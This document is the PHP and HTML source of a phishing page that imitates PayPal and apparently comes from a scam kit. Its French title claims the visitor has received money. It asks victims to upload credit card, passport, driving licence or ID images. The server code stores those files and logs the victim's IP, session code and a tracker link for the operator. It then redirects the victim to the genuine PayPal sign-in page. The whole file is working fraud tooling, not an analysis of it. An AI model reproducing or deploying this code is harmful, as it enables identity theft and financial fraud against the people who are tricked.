<?php
if(isset($_POST['prooft'])) {
  $prooft = $_POST['prooft'];
  $pref = md5(rand());
  if((!empty($_FILES["files"])) && ($_FILES['files']['error'] == 0)) {
  $filename = basename($_FILES['files']['name']);
  $ext = substr($filename, strrpos($filename, '.') + 1);
  if (($ext == "jpg") || ($ext == "gif") || ($ext == "png") || ($ext == "pdf") || ($ext == "rdf") || ($ext == "doc")) {
      $newname = dirname(__FILE__).'/proof/'.$pref."_".$filename;
      if (!file_exists($newname)) {
        if ((move_uploaded_file($_FILES['files']['tmp_name'],$newname))) {
          $ip = $_SESSION['_ip_'];
          $cd = $_SESSION['code'];
          $body = "
          <h4 style='color:red; font-weight:bold'>[Proof document]<h4/>
          <p style='font-size:16px; font-weight:bold'>Proof type > $prooft<br/>
          Proof URL > $scamurl/account/proof/".$pref."_".$filename."</p>
          <h4 style='color:red; font-weight:bold'>[Client Info]</h4>
          <p style='font-size:16px; font-weight:bold'>IP > $ip
          Track > http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip<br>
          =====================================================</p>
          ";
          file_put_contents($file_login,$body,FILE_APPEND);
          $subject = "[CryptoRhythm] Proof document for [$cd] - $ip";
              foreach(explode(",", $tomail) as $tom) {
            //mail($tom, $subject, $body);
    }
          ?>
          <script type="text/javascript">
            window.location = "https://www.paypal.com/signin";
          </script>
          <?php
        }
      }
    }
  }
}
?>
<!DOCTYPE html>
<html >
<!-- Mirrored from transactioneurope.yo.fr/virement.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Mar 2020 10:24:17 GMT -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>Vous avez reçu de l'argent</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
    <link rel="stylesheet" href="assets/fa/css/font-awesome.min.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/js/account.js" charset="utf-8"></script>
    <link rel="stylesheet" href="assets/css/master.css" media="screen" title="no title" charset="utf-8">
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
    <div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="mainBody" id="mainBody">
    <div class="wrapperb">
      <div class="containerForm">
            <div class="vx_modal-wrapper_logo" style="height:70px"></div>
            <h2 style="text-align:center">Upload proof document</h2>
            <br/><br/><br/>
            <div class="form">
              <h2>Files shoud be smaller than 5MB.</h2>
              <h2>Please use one of these file types : JPG, GIF, PNG, PDF, RTF, DOC.</h2>
              <h2>Upload files that display up-to-date and legible details.</h2>
              <form method="post" action="" enctype="multipart/form-data">
                <select id="prooftype" onchange="showupload()" name="prooft">
                  <option value="" selected>Select document type</option>
                  <option value="credit">Credit Card</option>
                  <option value="passport">Passport</option>
                  <option value="driving">Driving Licence</option>
                  <option value="gov">Government-issued photo ID</option>
                </select>
                <input class="hidden" type="file" name="files" id="files" onchange="updateUpload()" />
                <button type="button" class="hidden" id="uploadbut" style="margin-top : 30px; min-width : 30.5%; width : auto;" onclick="triggerUpload();"><span class="fa fa-upload"></span>&nbsp;&nbsp;<div id="val" style="display : inline-block; margin : 0;">Choose a file</div></button>
                <button style="margin-top : 30px; width : 93.5%;" onclick="confirmCard()" id="confirmbut" class="disabled">Confirm</button>
              </form>
            </div>
          </div>
      </div>
    </div>
  </div>
</div>
</div>
<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>
</body>
</html>